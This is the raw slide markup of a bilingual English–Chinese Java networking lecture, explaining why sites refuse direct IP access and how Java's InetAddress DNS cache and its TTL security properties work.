                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Default site (often disabled)</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257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>404 error</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1257300" lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>"Invalid Host Header" warning</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">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533400" y="914400"/>
            <a:ext cx="10058400" cy="5857240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>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3. SSL/TLS Certificate Requirements</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tabLst>
                <a:tab pos="4572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Certificate Binding: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>HTTPS certs are issued for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>domains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>【域名】</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>, not IPs:</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800100" lvl="1"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Valid: https://example.com</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800100" lvl="1"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Invalid: https://203.0.113.45 (certificate mismatch error</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>【证书不匹配错误】</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</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4. Business &amp; SEO Protection</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Brand Enforcement</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800100" lvl="1"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Prevents competitors from linking to your IP directly</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800100" lvl="1"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Stops scrapers from bypassing domain-based access controls</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400" b="1" dirty="0">
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SEO Optimization</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800100" lvl="1"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Search engines penalize duplicate content:</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800100" lvl="1" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Symbol" panose="05050102010706020507" pitchFamily="18" charset="2"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="4572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203.0.113.45/content vs example.com/content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="24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Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="76200" y="304800"/>
            <a:ext cx="11761259" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Here's why websites often prevent direct IP access and require domain names:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF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5. DNS Cache Programming</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402167" y="2095501"/>
            <a:ext cx="11387667" cy="3733800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Configure TTL settings (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>networkaddress.cache.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) for performance vs. freshness.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Handle negative caching (failed DNS lookups) appropriately.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can optimize DNS caching for dynamic IP environments (e.g., cloud deployments).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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533400" y="238125"/>
            <a:ext cx="7775575" cy="762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indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cache</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1143000"/>
            <a:ext cx="11810999" cy="5181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US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>The operation of looking up a domain name on a DNS server is very expensive: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>The process of looking up a domain name through DNS may go through multiple intermediate DNS servers to find the specified domain name.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>Java </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>provides </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>caching to solve this problem.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>When </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>class creates an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>InetAddress object using a domain name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>(such as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>www.szu.edu.cn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>for the first time </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the JVM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>saves the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>domain name and the information </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>obtains from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the DNS (such as the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>address) in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The next time </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>class uses this domain name, it obtains the required information directly from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the DNS cache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>without having to access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>server again.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>The DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>cache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3477FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>will always retain the domain name information that has been visited </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, but we can modify this default value.</a:t>
            </a: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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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387344"/>
            <a:ext cx="11387667" cy="4498975"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> class has a cache to store successful as well as unsuccessful host name resolutions.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>By default, when a security manager is installed, in order to protect against DNS spoofing attacks, the result of positive host name resolutions are cached forever.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>When a security manager is not installed, the default behavior is to cache entries for a finite (implementation dependent) period of time.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>The result of unsuccessful host name resolution is cached for a very short period of time (10 seconds) to improve performance.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>If the default behavior is not desired, then a Java security property can be set to a different Time-to-live (TTL) value for positive caching.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"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pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2326583" y="228600"/>
            <a:ext cx="6411018" cy="79983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25550"/>
            <a:ext cx="11387667" cy="5257800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Two Java security properties control the TIL values used for positive and negative host name resolution caching:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>networkaddress.cache.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Indicates the caching policy for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>successful name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> lookups from the name service. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>从名称服务成功查找名称时的缓存策略。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>The value is specified as integer to indicate the number of seconds to cache the successful lookup. The default setting is to cache for an implementation specific period of time. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>A value of -1 indicates cache forever</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>【</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>-1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>表示永久缓存】</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>(default: 10): Indicates the caching policy for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>un-successful name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> lookups from the name service.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>失败查找的缓存策略。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>The value is specified as integer to indicate the number of seconds to cache the failure for un-successful lookups</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>A value of 0 indicates "never cache", A value of -1 indicates "cache forever"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>【值</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>表示永不缓存，值</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>-1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>表示永久缓存】</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400"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pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2326583" y="228600"/>
            <a:ext cx="6411018" cy="79983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内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1219200"/>
            <a:ext cx="11506200" cy="5400675"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>DNS Query Costs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>DNS resolution is network-intensive and can take seconds to complete</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Java optimizes this through built-in caching of resolved addresses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Java's DNS Caching</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> caches successful name resolutions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Default cache duration: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Positive cache (successful lookups): implementation-dependent (typically longer)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Negative cache (failed lookups): 10 seconds  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>失败缓存</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0"/>
              <a:t>--10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0"/>
